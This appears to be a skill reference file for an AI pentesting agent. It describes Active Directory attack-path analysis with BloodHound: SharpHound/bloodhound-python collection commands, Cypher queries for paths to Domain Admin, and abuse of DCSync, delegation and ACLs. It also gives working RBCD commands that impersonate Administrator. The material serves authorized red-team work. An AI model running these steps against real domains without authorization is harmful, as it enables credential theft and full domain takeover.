---
name: bloodhound-analysis
version: 1.0.0
description: BloodHound/SharpHound data collection and attack path analysis for Phase 3 — graph-based AD enumeration, ACL/DACL analysis, delegation discovery, and escalation path prioritization
phase: 3
agent: exploit
mitre: T1087, T1069, T1482, T1069.002
ocd_branch: "Valid Creds"
---

# BloodHound Analysis — Phase 3 Reference

## Decision Tree

```
START (valid domain credentials)
  |
  v
1. Data Collection (bloodhound-python -c All)
  |
  v
2. Import to BloodHound CE (or Legacy)
  |
  v
3. Run Priority Queries:
  |
  +---> Shortest Path to DA (immediate wins)
  +---> Kerberoastable Users with DA Paths
  +---> Unconstrained Delegation Computers
  +---> Users with DCSync Rights
  +---> GenericAll/WriteDACL/WriteOwner Chains
  +---> ADCS Paths (ESC1-15 via certipy)
  |
  v
4. Prioritize by:
   a. Shortest hop count to DA
   b. Weakest link in chain (crackable hash, writable ACL)
   c. Stealth cost (noisy vs quiet techniques)
  |
  v
5. Execute highest-priority path → Phase 4
```

## Data Collection

### bloodhound-python (Pi5 Optimized)

The Python ingestor runs on Linux (no SharpHound .exe needed). On Pi5 ARM64,
always use `--timeout 120` for large domains.

```bash
# Full collection (ALL methods)
bloodhound-python -c All -d $DOMAIN -u $USER -p $PASS \
  -ns $DC --timeout 120 \
  | tee -a loot/phase3/bloodhound_collection.out

# If full collection is too slow, collect in stages:
bloodhound-python -c Group,LocalAdmin,Session -d $DOMAIN \
  -u $USER -p $PASS -ns $DC --timeout 120 \
  | tee -a loot/phase3/bloodhound_group_session.out

bloodhound-python -c ACL,Trusts,ObjectProps -d $DOMAIN \
  -u $USER -p $PASS -ns $DC --timeout 120 \
  | tee -a loot/phase3/bloodhound_acl_trusts.out

# Collection methods reference:
# Group       — group memberships
# LocalAdmin  — local admin relationships
# Session     — active sessions (who is logged in where)
# ACL         — ACL/DACL permissions
# Trusts      — domain trust relationships
# ObjectProps — user/computer object properties
# Container   — OU/Container structure
# All         — everything above
```

**Output:** JSON files in current directory. Move to `loot/bloodhound/` for organization.

```bash
mv *.json loot/bloodhound/
```

### BloodHound CE vs Legacy

| Feature | BloodHound CE | BloodHound Legacy |
|---------|--------------|-------------------|
| Backend | PostgreSQL + API | Neo4j |
| Interface | Web UI (port 8080) | Desktop app |
| Ingestor | bloodhound-python / SharpHound | Same |
| Custom queries | Cypher via API | Cypher in UI |
| Install on Pi5 | Docker or native | neo4j + java |
| Recommendation | Preferred (active development) | Fallback if CE unavailable |

```bash
# Check if BloodHound CE is running
curl -s http://localhost:8080/api/v2/available-domains 2>/dev/null \
  | tee -a loot/phase3/bloodhound_ce_status.out

# Upload data to BloodHound CE
# Use the web UI at http://localhost:8080 or API:
curl -X POST http://localhost:8080/api/v2/file-upload \
  -H "Authorization: Bearer $BH_TOKEN" \
  -F "file=@loot/bloodhound/computers.json"
```

## Priority Queries for Attack Path Discovery

### Query 1: Shortest Path to Domain Admin

The most critical query. Shows the minimum number of hops from your current
position to Domain Admin.

**BloodHound CE Cypher:**
```cypher
MATCH p=shortestPath((u:User {name:"$USER@$DOMAIN"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@$DOMAIN"}))
RETURN p
```

**What to look for:** Each edge is an attack step. Fewer hops = easier path.

### Query 2: Kerberoastable Users with Paths to DA

Service accounts with SPNs that have direct or indirect paths to Domain Admin.
Crack their TGS hash and you may skip several attack phases.

```cypher
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@$DOMAIN"}))
RETURN u.name, length(p) ORDER BY length(p) ASC
```

### Query 3: Unconstrained Delegation Computers

Computers with unconstrained delegation cache TGTs of connecting users.
Compromise one + coerce a DC to authenticate = instant DA via the TGT.

```cypher
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name CONTAINS "DC"
RETURN c.name, c.operatingsystem
```

### Query 4: Users with DCSync Rights

Users or groups with GetChanges + GetChangesAll on the domain object.
If your compromised user has these rights (or a path to someone who does),
DCSync immediately without needing DA.

```cypher
MATCH (u)-[:GetChanges|GetChangesAll]->(d:Domain)
RETURN u.name, u.objectid
```

### Query 5: GenericAll / WriteDACL / WriteOwner Paths

ACL-based attack paths. If user A has WriteDACL on user B, A can grant
itself any rights on B (including password reset or DCSync delegation).

```cypher
MATCH p=(u:User {name:"$USER@$DOMAIN"})-[:GenericAll|WriteDacl|WriteOwner|GenericWrite*1..]->(target)
RETURN p
```

**Common ACL chains:**
- GenericAll on User -> Force password change, add to group, set SPN (targeted Kerberoast)
- WriteDACL on Group -> Add self to group (e.g., Domain Admins)
- WriteOwner on Object -> Take ownership, then modify DACL
- GenericWrite on Computer -> RBCD (Resource-Based Constrained Delegation) attack
- ForceChangePassword -> Reset target's password directly

### Query 6: ADCS Certificate Template Abuse

Find certificate templates with dangerous configurations (ESC1-15).
Cross-reference with certipy output.

```cypher
MATCH (t:GPO)-[:Contains]->(c)
WHERE c.name CONTAINS "Certificate"
RETURN t.name, c.name
```

**Note:** For detailed ADCS analysis, prefer `certipy find` output —
it maps ESC variants directly. See `skills/adcs-attacks/SKILL.md`.

### Query 7: High-Value Targets (Tier 0 Assets)

```cypher
MATCH (c:Computer)
WHERE c.name CONTAINS "DC" OR c.name CONTAINS "CA" OR c.name CONTAINS "ADFS"
   OR c.name CONTAINS "SCCM" OR c.name CONTAINS "SQL"
RETURN c.name, c.operatingsystem, c.unconstraineddelegation
```

## ACL/DACL Analysis Methodology

1. **Map current user's effective permissions** across all objects
2. **Identify writable objects** that are in DA paths
3. **Check group-inherited permissions** (nested group memberships)
4. **Look for orphaned ACEs** from deleted accounts (reusable SIDs)

```bash
# NetExec DACL enumeration
netexec ldap $DC -u $USER -p $PASS -M daclread \
  -o TARGET=$TARGET_USER | tee -a loot/phase3/dacl_$TARGET_USER.out
```

## Delegation Analysis

### Unconstrained Delegation
Computer stores TGTs of all authenticating users. Compromise computer + coerce
DC authentication (PrinterBug/PetitPotam) = capture DC TGT = DCSync.

### Constrained Delegation
Computer/user can impersonate any user to specific services. If msDS-AllowedToDelegateTo
includes CIFS/DC or LDAP/DC, abuse for DA-equivalent access.

```bash
# Find delegation configurations
findDelegation.py $DOMAIN/$USER:$PASS -dc-ip $DC \
  | tee -a loot/phase3/delegation_$DOMAIN.out
```

### Resource-Based Constrained Delegation (RBCD)
If you have GenericWrite on a computer, set msDS-AllowedToActOnBehalfOfOtherIdentity
to a controlled account, then impersonate any user to that computer.

```bash
# Set RBCD (requires GenericWrite on target computer)
rbcd.py $DOMAIN/$USER:$PASS -delegate-to $TARGET$ -delegate-from $CONTROLLED$ \
  -dc-ip $DC -action write | tee -a loot/phase3/rbcd_setup_$TARGET.out

# Get service ticket via S4U
getST.py $DOMAIN/$CONTROLLED$:$PASS -spn cifs/$TARGET.$DOMAIN \
  -impersonate Administrator -dc-ip $DC \
  | tee -a loot/phase3/rbcd_s4u_$TARGET.out
```

## Reading BloodHound Graphs

**Edge types (attack relationships):**
| Edge | Meaning | Attack |
|------|---------|--------|
| MemberOf | Group membership | Inherit group permissions |
| AdminTo | Local admin rights | Remote exec, credential dump |
| HasSession | Active logon session | Credential harvesting potential |
| GenericAll | Full control | Password reset, SPN set, add to group |
| WriteDACL | Modify permissions | Grant self any right |
| WriteOwner | Take ownership | Then WriteDACL |
| ForceChangePassword | Reset password | Direct takeover |
| CanRDP | RDP access | Interactive session |
| CanPSRemote | PS Remoting access | WinRM/PowerShell |
| SQLAdmin | SQL Server admin | xp_cmdshell, NTLM relay |

**Path prioritization criteria:**
1. **Hop count** — fewer hops = simpler attack chain
2. **Weakest link** — crackable hash > ACL abuse > exploitation
3. **Stealth** — avoid noisy techniques (psexec, mass password reset)
4. **Prerequisite difficulty** — local admin already obtained > need to escalate first

## Operational Notes

- bloodhound-python on Pi5 ARM64: always `--timeout 120` for domains with >200 objects
- Large environments (>5000 objects): collect in stages to avoid memory pressure
- Session data is time-sensitive — re-collect if sessions are stale (>24h)
- Save all BloodHound JSON to `loot/bloodhound/` and summaries to `loot/phase3/`
- After analysis, write `loot/phase3/attack_paths.md` summarizing top 3 paths with steps
